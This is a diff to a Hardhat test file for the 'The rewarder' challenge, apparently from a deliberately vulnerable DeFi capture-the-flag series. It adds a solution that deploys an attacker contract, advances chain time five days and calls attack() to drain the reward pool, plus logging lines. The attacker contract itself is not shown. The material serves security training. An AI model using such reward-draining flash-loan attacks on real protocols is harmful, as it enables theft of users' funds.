@@ -70,6 +70,16 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const TheRewarderAttackerFactory = await ethers.getContractFactory('TheRewarderAttacker');
+        const attacker = await TheRewarderAttackerFactory.connect(player).deploy(
+            flashLoanPool.address,
+            rewarderPool.address,
+            rewardToken.address,
+            liquidityToken.address
+        );
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await attacker.connect(player).attack();
     });
 
     after(async function () {
@@ -84,6 +94,7 @@ describe('[Challenge] The rewarder', function () {
             await rewarderPool.connect(users[i]).distributeRewards();
             const userRewards = await rewardToken.balanceOf(users[i].address);
             const delta = userRewards.sub((await rewarderPool.REWARDS()).div(users.length));
+            console.log(`User ${i} rewards: ${ethers.utils.formatEther(userRewards)} PoolRewards:${ethers.utils.formatEther(await rewarderPool.REWARDS())} delta: ${ethers.utils.formatEther(delta)}`);
             expect(delta).to.be.lt(10n ** 16n)
         }
         
@@ -95,7 +106,7 @@ describe('[Challenge] The rewarder', function () {
         // The amount of rewards earned should be close to total available amount
         const delta = (await rewarderPool.REWARDS()).sub(playerRewards);
         expect(delta).to.be.lt(10n ** 17n);
-
+        console.log(`Player rewards: ${ethers.utils.formatEther(playerRewards)} delta: ${ethers.utils.formatEther(delta)}`);
         // Balance of DVT tokens in player and lending pool hasn't changed
         expect(await liquidityToken.balanceOf(player.address)).to.eq(0);
         expect(
